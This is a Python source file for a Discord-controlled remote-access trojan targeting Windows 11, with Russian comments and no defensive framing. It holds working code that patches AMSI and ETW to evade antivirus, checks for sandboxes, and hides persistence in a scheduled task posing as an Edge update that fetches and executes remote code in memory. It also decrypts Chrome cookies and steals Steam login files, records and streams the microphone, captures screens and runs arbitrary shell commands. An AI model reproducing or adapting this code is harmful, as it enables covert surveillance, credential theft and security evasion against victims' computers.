# file: bot_agent.py
# -*- coding: utf-8 -*-
"""
Unified Discord C2 Agent (Windows 11)
Включает в одном файле:
- Патч памяти AMSI / ETW (x64) и проверку песочницы
- Скрытую автозагрузку через COM Task Scheduler (мимо Диспетчера задач)
- Скрытый аудиоплеер WinMM MCI (отсутствует в микшере громкости Windows 11)
- Конструктор рекламы (Toast + TopMost окно с поддержкой своей картинки по URL, текста и ссылки)
- Прямой стрим микрофона в голосовой канал Discord (авто-конвертация Mono -> Stereo 48kHz)
- Захват всех мониторов, управление мышью/клавиатурой, буфер обмена, Steam/Cookies, BSOD, TTS, Killswitch
"""

import asyncio
import base64
import ctypes
import io
import json
import os
import shutil
import sqlite3
import subprocess
import sys
import tempfile
import threading
import time
import wave
import webbrowser
import winreg
from pathlib import Path

import comtypes
import discord
from discord.ext import commands
import keyboard
import mouse
import psutil
import pyaudio
import pyttsx3
import requests
import win32com.client
import win32crypt
from Crypto.Cipher import AES
from PIL import Image, ImageGrab, ImageTk
from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume

# ================= КОНФИГУРАЦИЯ =================
BOT_TOKEN = "c3c5720eedb6f9457b065ab8b6a8642fb6f2222588bf547e506bc206487132b0"
CONTROL_CHANNEL_ID = 1536306696832426054  # ID канала Discord (числом без кавычек)
RAW_GITHUB_URL = "https://raw.githubusercontent.com/ТВОЙ_НИК/ТВОЙ_РЕПО/main/bot_agent.py"
TASK_NAME = "MicrosoftEdgeUpdateTaskMachineUA2"
TASK_DESC = "Microsoft Edge Update Task Machine UA"
# ================================================


# ---------------------------------------------------------
# 1. ОБХОД АНТИВИРУСА: ПАТЧ ПАМЯТИ AMSI & ETW + ANTI-SANDBOX
# ---------------------------------------------------------
def check_environment() -> bool:
    """Отсекает эмуляторы антивирусов и автоматические песочницы."""
    if os.cpu_count() and os.cpu_count() < 2:
        return False
    if psutil.virtual_memory().total < 3 * (1024 ** 3):
        return False
    uptime_ms = ctypes.windll.kernel32.GetTickCount64()
    if uptime_ms < 120000:
        return False
    return True


def bypass_av_memory():
    """Патчит AmsiScanBuffer в amsi.dll и EtwEventWrite в ntdll.dll в памяти текущего процесса (x64)."""
    if sys.platform != "win32":
        return

    k32 = ctypes.windll.kernel32
    k32.GetProcAddress.restype = ctypes.c_void_p
    k32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
    k32.LoadLibraryA.restype = ctypes.c_void_p
    k32.LoadLibraryA.argtypes = [ctypes.c_char_p]
    k32.VirtualProtect.restype = ctypes.c_bool
    k32.VirtualProtect.argtypes = [
        ctypes.c_void_p,
        ctypes.c_size_t,
        ctypes.c_ulong,
        ctypes.POINTER(ctypes.c_ulong),
    ]

    PAGE_EXECUTE_READWRITE = 0x40
    old_prot = ctypes.c_ulong(0)

    # Патч AMSI: mov eax, 0x80070057; ret (E_INVALIDARG)
    try:
        h_amsi = k32.LoadLibraryA(b"amsi.dll")
        if h_amsi:
            addr = k32.GetProcAddress(h_amsi, b"AmsiScanBuffer")
            if addr:
                patch = b"\xB8\x57\x00\x07\x80\xC3"
                if k32.VirtualProtect(addr, len(patch), PAGE_EXECUTE_READWRITE, ctypes.byref(old_prot)):
                    ctypes.memmove(addr, patch, len(patch))
                    k32.VirtualProtect(addr, len(patch), old_prot.value, ctypes.byref(old_prot))
    except Exception:
        pass

    # Патч ETW: xor eax, eax; ret
    try:
        h_ntdll = k32.LoadLibraryA(b"ntdll.dll")
        if h_ntdll:
            addr = k32.GetProcAddress(h_ntdll, b"EtwEventWrite")
            if addr:
                patch = b"\x48\x33\xC0\xC3"
                if k32.VirtualProtect(addr, len(patch), PAGE_EXECUTE_READWRITE, ctypes.byref(old_prot)):
                    ctypes.memmove(addr, patch, len(patch))
                    k32.VirtualProtect(addr, len(patch), old_prot.value, ctypes.byref(old_prot))
    except Exception:
        pass


# ---------------------------------------------------------
# 2. СКРЫТАЯ АВТОЗАГРУЗКА ЧЕРЕЗ TASK SCHEDULER (COM)
# ---------------------------------------------------------
def install_stealth_task():
    """
    Регистрирует скрытую задачу в Планировщике Windows через COM Schedule.Service.
    Отсутствует во вкладке «Автозагрузка» Диспетчера задач, стартует через 20 сек после входа
    и бесфайлово подтягивает свежий код с GitHub прямо в ОЗУ.
    """
    try:
        comtypes.CoInitialize()
        scheduler = win32com.client.Dispatch("Schedule.Service")
        scheduler.Connect()
        root_folder = scheduler.GetFolder("\\")

        task_def = scheduler.NewTask(0)
        task_def.RegistrationInfo.Description = TASK_DESC

        task_def.Settings.Hidden = True
        task_def.Settings.DisallowStartIfOnBatteries = False
        task_def.Settings.StopIfGoingOnBatteries = False
        task_def.Settings.ExecutionTimeLimit = "PT0S"
        task_def.Settings.StartWhenAvailable = True
        task_def.Settings.MultipleInstances = 2  # IgnoreNew

        trigger = task_def.Triggers.Create(9)  # LogonTrigger
        trigger.Delay = "PT20S"
        user_domain = os.environ.get("USERDOMAIN", "")
        user_name = os.environ.get("USERNAME", "")
        if user_name:
            trigger.UserId = f"{user_domain}\\{user_name}".strip("\\")

        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            is_admin = False
        task_def.Principal.RunLevel = 1 if is_admin else 0
        task_def.Principal.LogonType = 3  # InteractiveToken

        pythonw = Path(sys.executable).with_name("pythonw.exe")
        exe_path = str(pythonw if pythonw.exists() else sys.executable)
        url_b64 = base64.b64encode(RAW_GITHUB_URL.encode("utf-8")).decode("ascii")

        action = task_def.Actions.Create(0)  # ExecAction
        action.Path = f'"{exe_path}"'
        action.Arguments = (
            f'-c "import urllib.request,base64;'
            f'u=base64.b64decode(\'{url_b64}\').decode();'
            f'exec(urllib.request.urlopen(u).read().decode(\'utf-8\'))"'
        )
        action.WorkingDirectory = os.path.dirname(exe_path)

        root_folder.RegisterTaskDefinition(TASK_NAME, task_def, 6, None, None, 3)
    except Exception:
        pass
    finally:
        try:
            comtypes.CoUninitialize()
        except Exception:
            pass


def uninstall_stealth_task():
    """Удаляет задачу из Планировщика и сбрасывает все хуки мыши и клавиатуры."""
    try:
        keyboard.unhook_all()
        ctypes.windll.user32.SwapMouseButton(False)
    except Exception:
        pass

    try:
        comtypes.CoInitialize()
        scheduler = win32com.client.Dispatch("Schedule.Service")
        scheduler.Connect()
        root_folder = scheduler.GetFolder("\\")
        root_folder.DeleteTask(TASK_NAME, 0)
    except Exception:
        pass
    finally:
        try:
            comtypes.CoUninitialize()
        except Exception:
            pass


# ---------------------------------------------------------
# 3. СКРЫТЫЙ АУДИОПЛЕЕР MCI (БЕЗ СЛЕДОВ В МИКШЕРЕ WINDOWS 11)
# ---------------------------------------------------------
def play_sound_mci(url: str):
    """
    Скачивает аудио по ссылке и воспроизводит через низкоуровневый WinMM MCI (winmm.dll).
    Не создает WASAPI-сессию и полностью отсутствует в микшере громкости Windows 11.
    """
    def _worker():
        try:
            r = requests.get(url, timeout=15)
            ext = ".mp3" if ".mp3" in url.lower() else ".wav"
            with tempfile.NamedTemporaryFile(delete=False, suffix=ext) as f:
                f.write(r.content)
                path = f.name

            alias = f"c2_track_{int(time.time() * 1000) % 100000}"
            winmm = ctypes.windll.winmm
            winmm.mciSendStringW(f"close {alias}", None, 0, None)

            cmd_open = f'open "{path}" type mpegvideo alias {alias}'
            if winmm.mciSendStringW(cmd_open, None, 0, None) == 0:
                winmm.mciSendStringW(f"play {alias} wait", None, 0, None)
                winmm.mciSendStringW(f"close {alias}", None, 0, None)

            try:
                os.remove(path)
            except Exception:
                pass
        except Exception:
            pass

    threading.Thread(target=_worker, daemon=True).start()


# ---------------------------------------------------------
# 4. КОНСТРУКТОР КАСТОМНОЙ РЕКЛАМЫ (С КАРТИНКОЙ И ТЕКСТОМ)
# ---------------------------------------------------------
def show_custom_ad(title: str, text: str, link: str = "", img_url: str = ""):
    """
    Выводит системное Toast-уведомление Windows 11 и всплывающее окно поверх всех игр (TopMost)
    с поддержкой собственной картинки по прямой ссылке (PNG/JPG), своего заголовка, текста и URL.
    """
    def _worker():
        img_local_path = ""
        pil_img = None
        if img_url:
            try:
                resp = requests.get(img_url, timeout=10)
                if resp.status_code == 200:
                    pil_img = Image.open(io.BytesIO(resp.content))
                    with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tf:
                        pil_img.save(tf.name, format="PNG")
                        img_local_path = tf.name
            except Exception:
                pass

        # 1. Нативное уведомление Windows 11 (с картинкой, если передан img_url)
        ps_safe_title = title.replace('"', '`"').replace('$', '`$')
        ps_safe_text = text.replace('"', '`"').replace('$', '`$')

        if img_local_path:
            ps_toast = (
                f'[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null;'
                f'$t = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastImageAndText02);'
                f'$n = $t.GetElementsByTagName("text");'
                f'$n.Item(0).AppendChild($t.CreateTextNode("{ps_safe_title}")) > $null;'
                f'$n.Item(1).AppendChild($t.CreateTextNode("{ps_safe_text}")) > $null;'
                f'$i = $t.GetElementsByTagName("image");'
                f'$i.Item(0).Attributes.GetNamedItem("src").NodeValue = "file:///{img_local_path.replace(chr(92), "/")}";'
                f'$toast = [Windows.UI.Notifications.ToastNotification]::new($t);'
                f'[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("Google Chrome").Show($toast)'
            )
        else:
            ps_toast = (
                f'[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null;'
                f'$t = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02);'
                f'$n = $t.GetElementsByTagName("text");'
                f'$n.Item(0).AppendChild($t.CreateTextNode("{ps_safe_title}")) > $null;'
                f'$n.Item(1).AppendChild($t.CreateTextNode("{ps_safe_text}")) > $null;'
                f'$toast = [Windows.UI.Notifications.ToastNotification]::new($t);'
                f'[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("Google Chrome").Show($toast)'
            )

        subprocess.Popen(
            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_toast],
            creationflags=0x08000000,
        )

        # 2. Всплывающее окно поверх всех окон (TopMost) с картинкой и кнопкой
        try:
            import tkinter as tk
            root = tk.Tk()
            root.title("Уведомление системы")
            root.attributes("-topmost", True)
            win_h = 380 if pil_img else 200
            root.geometry(f"440x{win_h}+850+450")
            root.configure(bg="#18181b")

            if pil_img:
                pil_resized = pil_img.copy()
                pil_resized.thumbnail((380, 160))
                tk_img = ImageTk.PhotoImage(pil_resized, master=root)
                lbl_img = tk.Label(root, image=tk_img, bg="#18181b", bd=0)
                lbl_img.image = tk_img
                lbl_img.pack(pady=(12, 4))

            tk.Label(root, text=title, fg="#facc15", bg="#18181b", font=("Segoe UI", 12, "bold")).pack(pady=(8, 4))
            tk.Label(root, text=text, fg="#ffffff", bg="#18181b", font=("Segoe UI", 10), wraplength=400).pack(pady=4)

            def _on_click():
                if link:
                    webbrowser.open(link)
                root.destroy()

            tk.Button(
                root,
                text="Перейти на сайт",
                bg="#0078d7",
                fg="white",
                font=("Segoe UI", 10, "bold"),
                relief="flat",
                command=_on_click,
            ).pack(pady=12, ipadx=14, ipady=4)

            root.mainloop()
        except Exception:
            pass
        finally:
            if img_local_path and os.path.exists(img_local_path):
                try:
                    os.remove(img_local_path)
                except Exception:
                    pass

    threading.Thread(target=_worker, daemon=True).start()


# ---------------------------------------------------------
# 5. МИКРОФОН, ОКНА И ВЫГРУЗКА ДАННЫХ (STEAM / COOKIES)
# ---------------------------------------------------------
def get_active_window() -> str:
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
    if length == 0:
        return "Рабочий стол (Desktop)"
    buf = ctypes.create_unicode_buffer(length + 1)
    ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
    return buf.value or "Рабочий стол (Desktop)"


def record_mic_wav(seconds: int) -> io.BytesIO:
    pa = pyaudio.PyAudio()
    try:
        stream = pa.open(format=pyaudio.paInt16, channels=1, rate=16000, input=True, frames_per_buffer=1024)
    except Exception as e:
        pa.terminate()
        raise RuntimeError(f"Не удалось открыть микрофон: {e}")

    frames = []
    total_chunks = int(16000 / 1024 * seconds)
    for _ in range(max(1, total_chunks)):
        frames.append(stream.read(1024, exception_on_overflow=False))

    stream.stop_stream()
    stream.close()
    pa.terminate()

    buf = io.BytesIO()
    with wave.open(buf, "wb") as wf:
        wf.setnchannels(1)
        wf.setsampwidth(2)
        wf.setframerate(16000)
        wf.writeframes(b"".join(frames))
    buf.seek(0)
    return buf


class PyAudioPCM(discord.AudioSource):
    """Поток для стриминга микрофона в голосовой канал Discord (авто-конвертер Mono -> Stereo 48kHz)."""
    def __init__(self):
        self.pa = pyaudio.PyAudio()
        self.is_stereo = True
        try:
            self.stream = self.pa.open(
                format=pyaudio.paInt16,
                channels=2,
                rate=48000,
                input=True,
                frames_per_buffer=960,
            )
        except Exception:
            self.stream = self.pa.open(
                format=pyaudio.paInt16,
                channels=1,
                rate=48000,
                input=True,
                frames_per_buffer=960,
            )
            self.is_stereo = False

    def read(self) -> bytes:
        try:
            raw = self.stream.read(960, exception_on_overflow=False)
            if not self.is_stereo:
                mono = memoryview(raw).cast("h")
                stereo = bytearray(len(raw) * 2)
                st_view = memoryview(stereo).cast("h")
                for i, s in enumerate(mono):
                    st_view[i * 2] = s
                    st_view[i * 2 + 1] = s
                return bytes(stereo)
            return raw
        except Exception:
            return b"\x00" * 3840

    def cleanup(self):
        try:
            self.stream.stop_stream()
            self.stream.close()
            self.pa.terminate()
        except Exception:
            pass


def dump_steam_and_cookies() -> io.BytesIO:
    bundle = {"steam_vdf": {}, "cookies": []}

    for sp in [Path("C:/Program Files (x86)/Steam"), Path("C:/Steam"), Path("D:/Steam")]:
        if sp.exists():
            for rel in ["config/loginusers.vdf", "config/config.vdf", "config/local.vdf"]:
                fp = sp / rel
                if fp.exists():
                    try:
                        bundle["steam_vdf"][rel] = base64.b64encode(fp.read_bytes()).decode("ascii")
                    except Exception:
                        pass

    local_vdf = Path(os.environ.get("LOCALAPPDATA", "")) / "Steam/local.vdf"
    if local_vdf.exists():
        try:
            bundle["steam_vdf"]["local.vdf"] = base64.b64encode(local_vdf.read_bytes()).decode("ascii")
        except Exception:
            pass

    chrome_dir = Path(os.environ.get("LOCALAPPDATA", "")) / "Google/Chrome/User Data"
    local_state = chrome_dir / "Local State"
    cookies_db = chrome_dir / "Default/Network/Cookies"

    if local_state.exists() and cookies_db.exists():
        tmp_db = Path(tempfile.gettempdir()) / f"c2_cache_{int(time.time())}.db"
        try:
            enc_key = base64.b64decode(json.loads(local_state.read_text(encoding="utf-8"))["os_crypt"]["encrypted_key"])[5:]
            master_key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]

            shutil.copy2(cookies_db, tmp_db)
            conn = sqlite3.connect(tmp_db)
            cur = conn.cursor()
            cur.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%steam%' LIMIT 60")
            for host, name, enc_val in cur.fetchall():
                if len(enc_val) >= 31 and enc_val[:3] in (b"v10", b"v11"):
                    try:
                        cipher = AES.new(master_key, AES.MODE_GCM, nonce=enc_val[3:15])
                        val = cipher.decrypt_and_verify(enc_val[15:-16], enc_val[-16:]).decode("utf-8", errors="ignore")
                        bundle["cookies"].append({"host": host, "name": name, "value": val})
                    except Exception:
                        pass
            conn.close()
        except Exception as e:
            bundle["error"] = str(e)
        finally:
            if tmp_db.exists():
                try:
                    tmp_db.unlink(missing_ok=True)
                except Exception:
                    pass

    out = io.BytesIO(json.dumps(bundle, indent=2, ensure_ascii=False).encode("utf-8"))
    out.seek(0)
    return out


# ---------------------------------------------------------
# 6. DISCORD C2 БОТ И КОМАНДНЫЙ ИНТЕРФЕЙС (С УЧЕТОМ ЛИМИТОВ)
# ---------------------------------------------------------
intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)


async def safe_send(ctx, text: str, filename: str = "output.txt"):
    """Учитывает лимит 2000 символов Discord: бьет текст на части или отправляет файлом."""
    if len(text) <= 1900:
        await ctx.send(text)
    elif len(text) <= 5500:
        lines = text.splitlines(keepends=True)
        chunk = ""
        for line in lines:
            if len(chunk) + len(line) > 1900:
                await ctx.send(chunk)
                chunk = line
            else:
                chunk += line
        if chunk:
            await ctx.send(chunk)
    else:
        buf = io.BytesIO(text.encode("utf-8"))
        await ctx.send("Результат превышает лимит сообщения и прикреплен файлом:", file=discord.File(buf, filename=filename))


@bot.event
async def on_ready():
    install_stealth_task()
    ch = bot.get_channel(CONTROL_CHANNEL_ID)
    if ch:
        user = os.environ.get("USERNAME", "User")
        domain = os.environ.get("USERDOMAIN", "PC")
        msg = (
            f"**[C2 СЕССИЯ АКТИВНА В ОЗУ]**\n"
            f"Узел: `{domain}\\{user}`\n"
            f"Активное окно: `{get_active_window()}`\n"
            f"Планировщик: задача `{TASK_NAME}` активна (скрыта из Диспетчера задач).\n"
            f"Для вывода полного описания всех команд введите `!menu`"
        )
        await ch.send(msg)


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"Ошибка: пропущен аргумент `{error.param.name}`. Введите `!menu` для справки.")
    elif isinstance(error, commands.CommandNotFound):
        pass
    else:
        await ctx.send(f"Ошибка выполнения команды: `{error}`")


@bot.command()
async def menu(ctx):
    help_text = (
        "**Полный список функций и команд Discord C2:**\n"
        "1. `!screen` — Скриншот всех мониторов в JPEG с заголовком активного окна\n"
        "2. `!window` — Показать заголовок текущего открытого окна\n"
        "3. `!cmd <команда>` — Выполнить любую команду в CMD/PowerShell в скрытом режиме\n"
        "4. `!sound <url>` — Скрыто воспроизвести звук по прямой ссылке (через WinMM MCI, не отображается в микшере громкости Windows 11)\n"
        "5. `!swap <k1> <k2>` — Поменять две клавиши на клавиатуре местами в реальном времени (пример: `!swap w s`)\n"
        "6. `!unswap` — Сбросить переназначение клавиш клавиатуры\n"
        "7. `!mouse move <x> <y>` — Переместить курсор мыши в координаты (x, y)\n"
        "8. `!mouse offset <dx> <dy>` — Сдвинуть мышь относительно текущей позиции\n"
        "9. `!mouse wheel <n>` — Прокрутить колесо мыши вверх/вниз (пример: `!mouse wheel -10`)\n"
        "10. `!mouse swap` / `!mouse restore` — Поменять местами ЛКМ и ПКМ или вернуть обратно\n"
        "11. `!mute <proc.exe>` / `!unmute <proc.exe>` — Точечно отключить/включить звук процессу в микшере (пример: `!mute discord.exe`)\n"
        "12. `!kill <proc.exe>` — Принудительно закрыть процесс по имени\n"
        "13. `!url <ссылка>` — Открыть ссылку в браузере по умолчанию\n"
        "14. `!ad <Заголовок>|<Текст>|<URL_сайта>|<URL_картинки>` — Кастомная реклама: Toast-уведомление + окно поверх экрана со своей картинкой и текстом\n"
        "15. `!rec [секунд]` — Записать голос с микрофона в WAV файл (до 120 сек)\n"
        "16. `!listen` / `!unlisten` — Подключить бота к голосовому каналу и слушать микрофон в прямом эфире\n"
        "17. `!steam` — Собрать файлы авторизации Steam (vdf) и расшифровать куки браузера\n"
        "18. `!tts <текст>` — Озвучить текст компьютерным голосом поверх игр\n"
        "19. `!bsod [секунд]` — Показать полноэкранный синий экран смерти без курсора\n"
        "20. `!banner <Заголовок>|<Текст>` — Установить свою надпись при загрузке Windows 11 перед ПИН-кодом\n"
        "21. `!clip_get` / `!clip_set <текст>` — Прочитать или подменить текст в буфере обмена\n"
        "22. `!off` — Выключить компьютер\n"
        "23. `!stop` — Остановить процесс в ОЗУ до следующей перезагрузки ПК\n"
        "24. `!uninstall` — Полный Killswitch: удалить скрытую задачу из Планировщика, снять все хуки и завершить процесс"
    )
    await safe_send(ctx, help_text)


@bot.command()
async def screen(ctx):
    try:
        img = ImageGrab.grab(all_screens=True)
        buf = io.BytesIO()
        img.convert("RGB").save(buf, format="JPEG", quality=80)
        buf.seek(0)
        await ctx.send(f"Активное окно: `{get_active_window()}`", file=discord.File(buf, filename="screen.jpg"))
    except Exception as e:
        await ctx.send(f"Ошибка скриншота: {e}")


@bot.command()
async def window(ctx):
    await ctx.send(f"Активное окно: `{get_active_window()}`")


@bot.command()
async def cmd(ctx, *, command: str):
    proc = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True,
        encoding="cp866",
        errors="replace",
        creationflags=0x08000000,
    )
    out = (proc.stdout + proc.stderr).strip() or "Команда выполнена (вывод пуст)."
    if len(out) > 1900:
        await safe_send(ctx, out, filename="cmd_output.txt")
    else:
        await ctx.send(f"```dos\n{out}\n```")


@bot.command()
async def sound(ctx, url: str):
    play_sound_mci(url)
    await ctx.send(f"Запущено скрытое воспроизведение через WinMM MCI (без отображения в микшере): `{url}`")


@bot.command()
async def swap(ctx, k1: str, k2: str):
    try:
        keyboard.unhook_all()
        keyboard.remap_key(k1, k2)
        keyboard.remap_key(k2, k1)
        await ctx.send(f"Клавиши `{k1}` и `{k2}` поменяны местами.")
    except Exception as e:
        await ctx.send(f"Ошибка клавиш: {e}")


@bot.command()
async def unswap(ctx):
    try:
        keyboard.unhook_all()
        await ctx.send("Переназначение клавиш сброшено.")
    except Exception as e:
        await ctx.send(f"Ошибка сброса: {e}")


@bot.command(name="mouse")
async def mouse_cmd(ctx, mode: str, val1: int = 0, val2: int = 0):
    try:
        if mode == "move":
            mouse.move(val1, val2, absolute=True, duration=0.1)
        elif mode == "offset":
            mouse.move(val1, val2, absolute=False, duration=0.05)
        elif mode == "wheel":
            mouse.wheel(val1)
        elif mode == "swap":
            ctypes.windll.user32.SwapMouseButton(True)
        elif mode == "restore":
            ctypes.windll.user32.SwapMouseButton(False)
        else:
            return await ctx.send("Доступные режимы: `move`, `offset`, `wheel`, `swap`, `restore`")
        await ctx.send(f"Действие мыши `{mode}` выполнено.")
    except Exception as e:
        await ctx.send(f"Ошибка мыши: {e}")


@bot.command()
async def mute(ctx, proc_name: str):
    try:
        comtypes.CoInitialize()
        sessions = AudioUtilities.GetAllSessions()
        hit = []
        for s in sessions:
            if s.Process and proc_name.lower() in s.Process.name().lower():
                s._ctl.QueryInterface(ISimpleAudioVolume).SetMute(1, None)
                hit.append(s.Process.name())
        await ctx.send(f"Звук отключен для: `{set(hit)}`" if hit else f"Процесс `{proc_name}` не найден в микшере.")
    except Exception as e:
        await ctx.send(f"Ошибка микшера: {e}")
    finally:
        try:
            comtypes.CoUninitialize()
        except Exception:
            pass


@bot.command()
async def unmute(ctx, proc_name: str):
    try:
        comtypes.CoInitialize()
        sessions = AudioUtilities.GetAllSessions()
        hit = []
        for s in sessions:
            if s.Process and proc_name.lower() in s.Process.name().lower():
                s._ctl.QueryInterface(ISimpleAudioVolume).SetMute(0, None)
                hit.append(s.Process.name())
        await ctx.send(f"Звук включен для: `{set(hit)}`" if hit else f"Процесс `{proc_name}` не найден в микшере.")
    except Exception as e:
        await ctx.send(f"Ошибка микшера: {e}")
    finally:
        try:
            comtypes.CoUninitialize()
        except Exception:
            pass


@bot.command()
async def kill(ctx, proc_name: str):
    killed = []
    for p in psutil.process_iter(["name"]):
        try:
            if p.info["name"] and proc_name.lower() in p.info["name"].lower():
                p.kill()
                killed.append(p.info["name"])
        except Exception:
            pass
    await ctx.send(f"Завершены процессы: `{set(killed)}`" if killed else f"Процесс `{proc_name}` не найден.")


@bot.command()
async def url(ctx, link: str):
    webbrowser.open(link)
    await ctx.send(f"Открыта ссылка: `{link}`")


@bot.command()
async def ad(ctx, *, payload: str):
    parts = [p.strip() for p in payload.split("|")]
    title = parts[0] if len(parts) > 0 and parts[0] else "Системное уведомление"
    text = parts[1] if len(parts) > 1 else ""
    link = parts[2] if len(parts) > 2 else ""
    img_url = parts[3] if len(parts) > 3 else ""

    # Если картинку прикрепили прямо к сообщению в Discord — берем её URL автоматически
    if not img_url and ctx.message.attachments:
        img_url = ctx.message.attachments[0].url

    show_custom_ad(title, text, link, img_url)
    await ctx.send(f"Рекламное окно и Toast запущены (Заголовок: `{title}`, Картинка: `{'Да' if img_url else 'Нет'}`).")


@bot.command()
async def rec(ctx, seconds: int = 5):
    if seconds > 120:
        return await ctx.send("Максимальная длительность записи — 120 секунд.")
    await ctx.send(f"Запись звука с микрофона ({seconds} сек.)...")
    try:
        wav_io = await asyncio.to_thread(record_mic_wav, seconds)
        await ctx.send("Аудиозапись микрофона:", file=discord.File(wav_io, filename="mic_capture.wav"))
    except Exception as e:
        await ctx.send(f"Ошибка записи: {e}")


@bot.command()
async def listen(ctx):
    if not ctx.author.voice:
        return await ctx.send("Ошибка: сначала зайдите в голосовой канал на сервере.")

    target_channel = ctx.author.voice.channel
    try:
        if ctx.voice_client:
            if ctx.voice_client.channel != target_channel:
                await ctx.voice_client.move_to(target_channel)
        else:
            await target_channel.connect()

        if ctx.voice_client.is_playing():
            ctx.voice_client.stop()

        ctx.voice_client.play(PyAudioPCM())
        await ctx.send(f"Прямая трансляция микрофона в канал `{target_channel.name}` запущена.")
    except Exception as e:
        await ctx.send(f"Ошибка стрима: {e}")


@bot.command()
async def unlisten(ctx):
    if ctx.voice_client:
        await ctx.voice_client.disconnect()
        await ctx.send("Трансляция микрофона остановлена.")
    else:
        await ctx.send("Бот не подключен к голосовому каналу.")


@bot.command()
async def steam(ctx):
    await ctx.send("Сбор сессионных файлов Steam и куки браузера...")
    try:
        dump_io = await asyncio.to_thread(dump_steam_and_cookies)
        await ctx.send("Выгрузка данных:", file=discord.File(dump_io, filename="steam_data.json"))
    except Exception as e:
        await ctx.send(f"Ошибка выгрузки: {e}")


@bot.command()
async def tts(ctx, *, text: str):
    def _speak():
        try:
            comtypes.CoInitialize()
            engine = pyttsx3.init()
            engine.say(text)
            engine.runAndWait()
        except Exception:
            pass
        finally:
            try:
                comtypes.CoUninitialize()
            except Exception:
                pass

    threading.Thread(target=_speak, daemon=True).start()
    await ctx.send(f"Озвучен текст: `{text}`")


@bot.command()
async def bsod(ctx, seconds: int = 10):
    def _show():
        try:
            import tkinter as tk
            r = tk.Tk()
            r.attributes("-fullscreen", True)
            r.attributes("-topmost", True)
            r.configure(bg="#0078d7", cursor="none")
            r.protocol("WM_DELETE_WINDOW", lambda: None)
            tk.Label(r, text=":(", fg="white", bg="#0078d7", font=("Segoe UI Light", 110)).place(x=150, y=120)
            tk.Label(
                r,
                text="На вашем устройстве возникла проблема, и его необходимо перезагрузить.\n\nВыполнено: 100%\nКод остановки: CRITICAL_PROCESS_DIED",
                fg="white",
                bg="#0078d7",
                font=("Segoe UI", 22),
                justify="left",
            ).place(x=150, y=340)
            r.after(max(1, seconds) * 1000, r.destroy)
            r.mainloop()
        except Exception:
            pass

    threading.Thread(target=_show, daemon=True).start()
    await ctx.send(f"Фейковый BSOD выведен на {seconds} сек.")


@bot.command()
async def banner(ctx, *, payload: str):
    parts = payload.split("|", 1)
    cap = parts[0].strip() if len(parts) > 0 else "Системное предупреждение"
    txt = parts[1].strip() if len(parts) > 1 else ""
    try:
        k = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(k, "legalnoticecaption", 0, winreg.REG_SZ, cap)
        winreg.SetValueEx(k, "legalnoticetext", 0, winreg.REG_SZ, txt)
        winreg.CloseKey(k)
        await ctx.send("Надпись при входе в Windows 11 успешно установлена.")
    except PermissionError:
        await ctx.send("Ошибка: требуются права Администратора для записи в HKLM.")
    except Exception as e:
        await ctx.send(f"Ошибка установки баннера: {e}")


@bot.command()
async def clip_get(ctx):
    proc = subprocess.run(
        ["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
        capture_output=True,
        text=True,
        encoding="cp866",
        errors="replace",
        creationflags=0x08000000,
    )
    val = proc.stdout.strip() or "[Буфер обмена пуст]"
    await safe_send(ctx, f"Содержимое буфера обмена:\n```\n{val}\n```", filename="clipboard.txt")


@bot.command()
async def clip_set(ctx, *, text: str):
    safe_text = text.replace("'", "''")
    subprocess.run(
        ["powershell", "-NoProfile", "-Command", f"Set-Clipboard -Value '{safe_text}'"],
        creationflags=0x08000000,
    )
    await ctx.send("Буфер обмена обновлен.")


@bot.command()
async def off(ctx):
    await ctx.send("Выключение ПК...")
    subprocess.Popen('shutdown /s /t 3 /c "Завершение работы системы"', shell=True, creationflags=0x08000000)


@bot.command()
async def stop(ctx):
    keyboard.unhook_all()
    ctypes.windll.user32.SwapMouseButton(False)
    await ctx.send("Процесс остановлен в ОЗУ до следующей перезагрузки.")
    await bot.close()
    os._exit(0)


@bot.command()
async def uninstall(ctx):
    uninstall_stealth_task()
    await ctx.send(f"Задача `{TASK_NAME}` удалена из Планировщика, хуки сняты, процесс завершен.")
    await bot.close()
    os._exit(0)


if __name__ == "__main__":
    if check_environment():
        bypass_av_memory()
        bot.run(BOT_TOKEN)
